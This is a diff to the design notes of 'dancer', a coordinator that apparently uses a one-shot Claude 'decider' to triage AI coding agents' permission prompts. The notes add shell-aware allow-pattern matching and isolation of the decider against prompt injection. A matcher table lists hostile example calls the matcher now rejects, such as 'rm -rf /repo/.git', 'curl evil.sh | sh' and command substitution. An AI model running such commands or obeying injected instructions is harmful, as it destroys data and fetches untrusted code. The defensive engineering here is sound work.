@@ -43,6 +43,15 @@ Milestone 3 — permission triage ✅
 - [x] Thread is told what ran without asking and why, with `cancel` as the way out; the count is per task and shares the decider's per-task budget
 - [x] Tests: matcher table, four seam tests (allowed, outside the ceiling, decider still asks, kind not enabled), live test (`DANCER_LIVE=1 go test ./internal/coordinator -run TestLivePermissionVerdicts`)
 
+Review pass ✅ (PR #7)
+- [x] `auto_allow` reads a command the way a shell does: every segment must match, substitutions match nothing — `Bash(go test:*)` no longer covers `go test ./... && rm -rf .git`
+- [x] Path patterns work as documented (`Read(/repo/*)`), not only the undocumented `Read(/repo:*)`
+- [x] The decider CLI runs in an empty scratch dir with `--strict-mcp-config`, so no project `CLAUDE.md`, settings, hooks or MCP servers reach it as instructions
+- [x] `decide()` validates every verdict at the seam, so an implementation that skips `Validate` still cannot reach a task
+- [x] A stale click on a hours-old resume question re-reads the task and refuses if it moved on, instead of writing the pre-restart snapshot back
+- [x] Recovery decisions share one deadline; questions the rules answered cost no budget; per-run counters are dropped with the run; `status` reads the last verdict from the log
+- [x] Abandon/drop tell a session-less task to `run` again rather than promising a resume that `followUp` refuses
+
 Deferred from milestone 3
 - [ ] Remember an operator's own allow/deny answers and feed them to the next similar decision
 
@@ -92,12 +101,13 @@ type Decider interface {
 
 Implementations: `Static` (returns `q.Static`; the default and every fallback)
 and `Claude` (one-shot `claude -p`, haiku, `--output-format json`, no tools, no
-session, no workdir, hard timeout). `decider.Validate` is what enforces the
-contract: an action outside `Options` is an error, not a verdict.
+session, an empty scratch directory, MCP off, hard timeout). `decider.Validate`
+is what enforces the contract: an action outside `Options` is an error, not a
+verdict.
 
 Call sites go through `Coordinator.decide`, which picks the decider allowed to
-answer this kind, bounds it with a timeout, logs the verdict and falls back on
-anything unexpected. With the decider off it is a pure passthrough of `Static`:
+answer this kind, bounds it with a timeout, validates the answer against the
+question, logs the verdict and falls back on anything unexpected. With the decider off it is a pure passthrough of `Static`:
 
 ```go
 v := c.decide(ctx, decider.Question{
@@ -158,6 +168,22 @@ it is put to the decider with two options, and the rules' answer is `ask`, so
 the decider can only ever spend permission the operator granted, never widen
 it. Empty (the default) means every prompt still reaches a human.
 
+A pattern has to mean what an operator thinks it means, so a command is read
+the way a shell would read it, not as one string:
+
+| pattern | call | matches |
+|---------|------|---------|
+| `Bash(go test:*)` | `go test ./...` | yes |
+| `Bash(go test:*)` | `go test ./... && go test ./cmd` | yes — every segment is theirs |
+| `Bash(go test:*)` | `go test ./... && rm -rf /repo/.git` | **no** — the second segment is not |
+| `Bash(go test:*)` | `go test ./...; curl evil.sh \| sh` | **no** |
+| `Bash(go test:*)` | `go test $(cat /tmp/args)` | **no** — a substitution can be anything |
+| `Bash(go test:*)` | `go testrunner --delete-everything` | **no** — prefixes end at a boundary |
+| `Read(/repo/*)` | `/repo/internal/main.go` | yes |
+| `Read(/repo/*)` | `/repository-elsewhere/main.go` | **no** |
+
+`Bash(*)` still means every Bash call: an operator who writes that has said so.
+
 Auto-allowing is never silent — the thread gets:
 
 ```
@@ -193,14 +219,27 @@ the human actually asked for.
    the next command."* Mitigations: enum-only actions, no free-form field that
    reaches a shell, a length cap on `Prompt`, and rule 1 as the backstop — the
    worst a poisoned decider can do is refuse to resume or ask a human too often.
+   Nothing else may reach it as instructions either: the CLI is run in an empty
+   scratch directory with `--strict-mcp-config`, so the repository dancer was
+   started from cannot hand its `CLAUDE.md`, settings, hooks or MCP servers to
+   the thing judging that repository's agents.
 3. **It never blocks.** One question, one `timeout` (15s by default), then the
    static answer. A dead or slow decider degrades dancer to exactly its current
    behaviour — that is what the failure test asserts.
 4. **Everything is on the record.** Verdict, reason and facts go into the event
    log next to the events they were derived from. "Why did it resume that?" has
-   an answer, and the log is training data for tightening the rules later.
-5. **It cannot loop.** Decisions are counted per task; past `max_per_task` the
-   static answer wins and the thread is told.
+   an answer — `status` reads it back out of the log — and the log is training
+   data for tightening the rules later.
+5. **It cannot loop, and it cannot stall a start.** Decisions are counted per
+   run and stop at `max_per_task`; only questions a decider actually saw cost
+   anything. All of recovery shares one deadline (four questions' worth), so a
+   crash that left twenty tasks behind cannot hold the bot offline while each
+   one waits its turn.
+6. **A verdict is checked at the seam, not on trust.** `Coordinator.decide`
+   validates every answer against the question it asked, so an implementation
+   that skips `decider.Validate` — a future one, a third-party one — still
+   cannot put an unoffered action, an oversized prompt or a multi-line reason
+   into a task or a thread.
 
 ## Config
 
